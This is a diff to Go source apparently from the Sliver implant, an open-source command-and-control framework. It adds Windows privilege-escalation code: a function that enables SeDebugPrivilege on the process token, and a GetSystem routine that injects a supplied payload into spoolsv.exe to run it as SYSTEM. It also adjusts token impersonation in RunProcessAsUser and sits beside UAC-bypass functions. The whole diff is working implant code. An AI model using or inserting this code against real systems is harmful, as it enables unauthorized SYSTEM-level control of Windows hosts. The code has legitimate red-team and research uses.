@@ -6,9 +6,10 @@ import (
 	// {{if .Debug}}
 	"log"
 	// {{end}}
+	"fmt"
 	"os"
 	"os/exec"
-	"sync"
+	"runtime"
 	"syscall"
 	"time"
 	"unsafe"
@@ -16,6 +17,7 @@ import (
 	"golang.org/x/sys/windows/registry"
 
 	"sliver/sliver/ps"
+	"sliver/sliver/taskrunner"
 )
 
 const (
@@ -122,6 +124,40 @@ func impersonateLoggedOnUser(hToken syscall.Token) (err error) {
 	return
 }
 
+func sePrivEnable(s string) error {
+	var tokenHandle syscall.Token
+	thsHandle, err := syscall.GetCurrentProcess()
+	if err != nil {
+		return err
+	}
+	syscall.OpenProcessToken(
+		//r, a, e := procOpenProcessToken.Call(
+		thsHandle,                       //  HANDLE  ProcessHandle,
+		syscall.TOKEN_ADJUST_PRIVILEGES, //	DWORD   DesiredAccess,
+		&tokenHandle,                    //	PHANDLE TokenHandle
+	)
+	var luid LUID
+	err = lookupPrivilegeValue(nil, syscall.StringToUTF16Ptr(s), &luid)
+	if err != nil {
+		// {{if .Debug}}
+		log.Println("LookupPrivilegeValueW failed", err)
+		// {{end}}
+		return err
+	}
+	privs := TOKEN_PRIVILEGES{}
+	privs.PrivilegeCount = 1
+	privs.Privileges[0].Luid = luid
+	privs.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED
+	err = adjustTokenPrivileges(tokenHandle, false, &privs, 0, nil, nil)
+	if err != nil {
+		// {{if .Debug}}
+		log.Println("AdjustTokenPrivileges failed", err)
+		// {{end}}
+		return err
+	}
+	return nil
+}
+
 func getPrimaryToken(pid uint32) (*syscall.Token, error) {
 	handle, err := syscall.OpenProcess(syscall.PROCESS_QUERY_INFORMATION, true, pid)
 	if err != nil {
@@ -144,6 +180,9 @@ func getPrimaryToken(pid uint32) (*syscall.Token, error) {
 func enableCurrentThreadPrivilege(privilegeName string) error {
 	ct, err := getCurrentThread()
 	if err != nil {
+		// {{if .Debug}}
+		log.Println("GetCurrentThread failed", err)
+		// {{end}}
 		return err
 	}
 	var t syscall.Token
@@ -214,6 +253,10 @@ func impersonateProcess(pid uint32) (newToken syscall.Token, err error) {
 }
 
 func impersonateUser(username string) (token syscall.Token, err error) {
+	if username == "" {
+		err = fmt.Errorf("username can't be empty")
+		return
+	}
 	p, err := ps.Processes()
 	if err != nil {
 		return
@@ -287,10 +330,9 @@ func bypassUAC(command string) (err error) {
 // RunProcessAsUser - Retrieve a primary token belonging to username
 // and starts a new process using that token.
 func RunProcessAsUser(username, command, args string) (out string, err error) {
-	var wg sync.WaitGroup
-	wg.Add(1)
 	go func(out string) {
-		defer wg.Done()
+		runtime.LockOSThread()
+		defer runtime.UnlockOSThread()
 		token, err := impersonateUser(username)
 		if err != nil {
 			// {{if .Debug}}
@@ -314,7 +356,6 @@ func RunProcessAsUser(username, command, args string) (out string, err error) {
 		}
 		out = string(output)
 	}(out)
-	wg.Wait()
 	return
 }
 
@@ -327,6 +368,34 @@ func Elevate() (err error) {
 		// {{if .Debug}}
 		log.Println("BypassUAC failed:", err)
 		// {{end}}
+	}
+	return
+}
+
+// GetSystem starts a new RemoteTask in a SYSTEM owned process
+func GetSystem(data []byte) (err error) {
+	hostingProcess := "spoolsv.exe"
+	runtime.LockOSThread()
+	defer runtime.UnlockOSThread()
+	procs, _ := ps.Processes()
+	for _, p := range procs {
+		if p.Executable() == hostingProcess {
+			err = sePrivEnable("SeDebugPrivilege")
+			if err != nil {
+				// {{if .Debug}}
+				log.Println("sePrivEnable failed:", err)
+				// {{end}}
+				return
+			}
+			err = taskrunner.RemoteTask(p.Pid(), data)
+			if err != nil {
+				// {{if .Debug}}
+				log.Println("RemoteTask failed:", err)
+				// {{end}}
+				return
+			}
+			break
+		}
 	}
 	return
 }
